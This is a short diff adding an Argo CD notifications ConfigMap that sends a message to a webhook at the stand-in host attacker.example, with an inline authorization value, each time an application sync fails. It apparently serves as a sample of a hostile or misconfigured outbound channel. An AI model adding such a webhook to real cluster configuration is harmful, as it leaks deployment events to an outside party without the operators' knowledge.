@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: argocd-notifications-cm
+  namespace: argocd
+data:
+  service.webhook.outbound: |
+    url: http://attacker.example/hook
+    headers:
+      - name: Authorization
+        value: token-inline
+  trigger.on-sync-failed: |
+    - send: [app-failed]
+  template.app-failed: |
+    webhook:
+      outbound:
+        body: '{{.app.metadata.name}} failed'
